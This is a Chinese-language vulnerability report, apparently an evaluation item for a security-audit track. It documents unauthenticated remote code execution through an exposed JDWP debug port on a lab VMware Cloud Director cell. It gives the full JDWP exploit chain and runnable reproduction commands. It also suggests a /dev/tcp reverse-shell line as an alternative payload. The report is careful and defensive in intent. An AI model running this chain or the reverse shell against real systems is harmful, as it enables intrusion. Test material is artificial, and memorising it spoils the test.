# VMware Cloud Director 10.6.1.1（192.168.98.x）— 未认证 JDWP 调试口导致远程代码执行

> ⚠️ **适用轨道标注（必读）**：本项**仅适用于「运行时·主机面」轨道**，**不适用于「仅源码审计」轨道**。
> 原因：本漏洞的**全部证据载体都在运行时/主机面**（JVM 启动参数、`/proc/<pid>/environ`、主机 iptables），
> 在源码/仓库中**没有任何表示物** —— 仅凭源码审计必然漏报，把它算作源码审计评测项不公平，故**不应计入该轨道通过率**。
> 反向说明：一旦给到网络/主机面权限，本项只需 3 个廉价动作即可命中
> （`/proc/<pid>/cmdline` → `ss -tlnp` → `JDWP-Handshake` 往返），是运行时轨道的**正样本**。
>
> **前置条件（两条，缺一不可；不满足则不可达）**
> 1. JVM 启动环境注入 `VCLOUD_JAVA_OPTS=-agentlib:jdwp=...,address=*:5005`
>    （产品默认关闭：`VCLOUD_DEBUG_DEFAULT="n"`；产品自带开关用的是 `*:8000` + `-Xrunjdwp`）；
> 2. 主机防火墙对该来源放行 5005（本机 `iptables -P INPUT DROP`，仅 `-s 192.168.101.x/32` 放行）。
>
> **定性**：`配置-部署态 / 环境暴露`，**非产品 CVE、非 VMware 默认行为**；**不得**表述为“复现某 CVE”。
> 注入载体未定位（全机无任何持久化配置含该变量，仅进程环境可见）→ **无法区分**“排障临时开启后遗留”与“为测试环境刻意布设”。

> 复现方式分层（按仓库 README）：**真实网络攻击路径** —— 从攻击机经 TCP `5005`（JDWP）直接触发，未使用任何凭据、未登录 vCD。
>
> 性质：**部署/环境配置层面的调试口暴露被成功利用**，不是 VMware 产品默认行为，也未映射到 VCD 专属 CVE（见第五节）。VMware 官方脚本默认关闭该调试口（`VCLOUD_DEBUG_DEFAULT="n"`）。
>
> 结论强度：**已验证（高危）**。四段证据链（输入来源 / 校验逻辑 / 绕过条件 / 放行效果）均已闭环，且放行效果经**独立通道**复核。
>
> 敏感信息：本文件不含口令 / token。内网 IP 仅作本地工作记录。

## 二、四段证据链

### ① 输入来源 / 可达性

- cell 进程命令行（`/proc/3171580/cmdline`）含：
  `-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005`
  → **JDWP 绑定所有网卡**（`address=*`），`suspend=n`（启动不暂停）。
- 进程环境（`/proc/3171580/environ`）：
  `VCLOUD_JAVA_OPTS= -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005`
  → 调试参数由环境变量注入。
- 主机防火墙（`iptables -S`）：`-P INPUT DROP`，且存在
  `-A INPUT -s 192.168.101.x/32 -p tcp -m state --state NEW --dport 5005 -j ACCEPT`
  → **5005 仅对 `192.168.101.x`（本分析机）显式放行**；属**白名单内可达**，不是全网段 pre-auth。
- 从分析机 TCP 连 `5005` 成功。

### ② 校验逻辑（接口侧无任何认证）

- `JDWP-Handshake` 往返成功（**未提交任何凭据/令牌**）。
- `VirtualMachine.Version`（cmdset 1 / cmd 1）返回：
  `vmName=OpenJDK 64-Bit Server VM`、`vmVersion=11.0.23.0.1`、`jdwp=11.0`。
- `VirtualMachine.AllThreads`（1/4）返回 **344** 个线程，并可经 `ThreadReference.Name`（11/1）读取线程名，
  可见 vCD 内部线程（`pool-jetty-*`、`Tomcat JDBC Pool Cleaner`、`Artemis ... DiscoveryGroup`、
  `com.vmware.vcloud.consoleproxy.server.ConsoleProxyCellApplication ...` 等）。
  → **未认证读访问**（JVM 内部结构 / 线程名）已实证。

### ③ 绕过条件 / 利用手法

JDWP 本身不设认证，因此不存在“绕过”而只需“可达 + 正确驱动协议”。为稳定拿到**可调用的挂起线程**，采用：

1. 在**已加载**的热点方法 `java.util.HashMap.get` 上设断点，`suspendPolicy = SUSPEND_EVENTTHREAD(1)`
   → 只挂起事件线程，避免全 VM 冻结。
   - 反证/踩坑记录：同一 JVM 上改用 `suspendPolicy = SUSPEND_ALL(2)` 时，随后的 `ClassType.InvokeMethod`
     **不返回**（超时/死锁），且会冻结整个 VM；改为 `SUSPEND_EVENTTHREAD` 后一次成功。
   - 反证/踩坑记录：直接取 `AllThreads` 的线程 id 去 `InvokeMethod`，全部返回 `JDWP error 10 (INVALID_THREAD)`
     —— **必须使用事件给出的存活线程 id**（JDWP 对象 id 会随目标线程对象被回收而失效）。
2. 读取 `Composite` 断点事件，取出事件线程 id。
3. `ClassType.InvokeMethod`（3/3）调用 `java.lang.Runtime.getRuntime()`。
4. `ObjectReference.InvokeMethod`（9/6）调用 `Runtime.exec(String)`。
5. `VirtualMachine.Resume`（1/9）恢复。

### ④ 放行效果（实测闭环 + 独立通道复核）

PoC 执行两条无害标记命令：

```
/bin/sh -c id>/tmp/vcd_jdwp_poc_id.txt
/bin/sh -c hostname>/tmp/vcd_jdwp_poc_host.txt
```

- JDWP 侧返回：`Runtime=0x10`，两次 `exec` 均返回非空 `Process` 对象（`0x11`、`0x13`）。
- **独立通道（root SSH）复核落盘产物**：

```
-rw------- 1 vcloud vcloud 16 /tmp/vcd_jdwp_poc_host.txt
-rw------- 1 vcloud vcloud 54 /tmp/vcd_jdwp_poc_id.txt
$ cat /tmp/vcd_jdwp_poc_id.txt
uid=1003(vcloud) gid=1002(vcloud) groups=1002(vcloud)
$ cat /tmp/vcd_jdwp_poc_host.txt
vcd01.lab.local
```

- 文件属主/属组 `vcloud` 与 cell JVM 用户一致（`ps -o user= -p 3171580` → `vcloud`），证明命令**由 JVM 进程派生的子进程执行**。
- 利用后目标健康：cell pid 未变、`/api/versions` = 200。

## 三、复现步骤（可复跑）

```bash
# 1) 可达性
nc -zvw3 192.168.98.x 5005

# 2) 无认证确认（握手）
python3 -c "import socket;s=socket.create_connection(('192.168.98.x',5005),timeout=8);\
s.sendall(b'JDWP-Handshake');print(s.recv(14))"     # -> b'JDWP-Handshake'

# 3) RCE（无害标记）
python3 poc_jdwp_rce.py 192.168.98.x 5005 \
    --cmd "/bin/sh -c id>/tmp/jdwp_poc.txt"

# 4) 独立通道验证产物（经授权 SSH）
#    cat /tmp/jdwp_poc.txt
```

PoC：`poc_jdwp_rce.py`（自包含 Python 3，标准库；内含最小 JDWP 客户端 + 断点/事件/调用链）。

> 说明：`Runtime.exec(String)` 会用空白切分并**不经 shell**，因此用
> `/bin/sh -c <cmd>/<redir>` 这种“三段式”写法即可在目标上执行任意 shell 命令并落盘取回。
> 需要反弹交互 shell 时，同一条链换成 `bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'` 亦可（本轮未做）。

## 四、影响与严重级别

- **未认证远程代码执行**，权限 = cell JVM 用户 `vcloud`（`uid=1003`）。
- 可达范围限定：JDWP 监听 `*:5005`，但该机 `INPUT` 默认策略为 `DROP`，5005 **仅对 `-s 192.168.101.x/32` 放行**。
  ⇒ 精确表述应为「**白名单来源可达的未认证 RCE**」；**不得**表述为“全网段 pre-auth RCE”。
- 该来源一旦可达，即：单 TCP 连接、无凭据、可读 JVM 内部并可执行任意命令 → 评级 **高（High）**。

## 五、性质判定 / CVE 映射

- **不是产品默认**：`/opt/vmware/vcloud-director/bin/vmware-vcd-cell-common` 中
  `VCLOUD_DEBUG_DEFAULT="n"`；脚本默认调试地址为 `*:8000` 且用 `-Xrunjdwp`；本机实际是
  `-agentlib:jdwp=...address=*:5005`，来源为环境变量 `VCLOUD_JAVA_OPTS`。
  在 `/etc`、`/opt/vmware`、`/root` 中**未找到** `VCLOUD_JAVA_OPTS=` 赋值处（推断为启动时 shell 环境注入，
  该 cell 已连续运行 36 天，启动环境已不可回溯）→ **部署/环境层面的调试口暴露**。
- **未检索到 VCD 专属 JDWP CVE**：NVD `keywordSearch=JDWP` = 0；`Debug Wire Protocol` 命中的均为其他厂商
  （SonicWall/NetApp/NETGEAR/EMC 等）；`Cloud Director` 相关 CPE 枚举仅
  `CVE-2020-3956 / CVE-2022-22966 / CVE-2023-34060 / CVE-2024-22256 / CVE-2024-22272`，
  **均在本版本（10.6.1.1）之前修复**，且与 JDWP 无关。
  ⇒ 本结论**不得**标注为“复现某 CVE”。
